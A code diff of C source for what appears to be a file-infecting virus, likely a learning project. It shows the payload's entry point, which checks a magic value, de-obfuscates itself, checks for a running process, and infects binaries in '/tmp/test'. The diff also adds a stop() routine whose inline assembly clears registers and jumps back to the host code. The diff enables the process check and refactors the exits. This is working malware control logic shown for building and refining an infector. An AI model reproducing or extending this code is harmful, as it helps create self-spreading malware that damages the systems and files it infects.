@@ -33,7 +33,8 @@ static size_t strlen(const char *s);
 static int  checkProcess(char *dirname);
 static int  infectBins(const char *dirname);
 static void *memcpy(void *dest, const void *src, size_t);
-static int unObfuscate(void);
+static int  unObfuscate(void);
+static int  stop(int status, void *magic);
 
 int   entry_point(void *magic) {
   char    infectDir[] = "/tmp/test";
@@ -42,17 +43,21 @@ int   entry_point(void *magic) {
 
   if (magic != (void *)0x42)
     if (unObfuscate() == -1)
-      return (1);
-  /* if (checkProcess(procName) != 0) */
-  /*   return (1); */
+      return (stop(1, magic));
+  if (checkProcess(procName) != 0)
+    return (stop(1, magic));
   /* if (preventDebug() != 0) */
   /*   return (1); */
   if (infectBins(infectDir) == -1)
-    return (1);
+    return (stop(1, magic));
   /* if (infectBins(infectDir2) == -1) */
   /*   return (1); */
+  return (stop(0, magic));
+}
+
+static int   stop(int status, void *magic) {
   if (magic == (void *)0x42)
-    return (0);
+    return (status);
   asm("mov $0, %rax\n\t"
       "mov $0, %rbx\n\t"
       "mov $0, %rcx\n\t"
@@ -69,6 +74,7 @@ int   entry_point(void *magic) {
       "mov $0, %r15\n\t"
       "leave\n\t"
       "jmp endSC");
+  return (status);
 }
 
 static int  mprotect(void *addr, size_t len, int prot) {
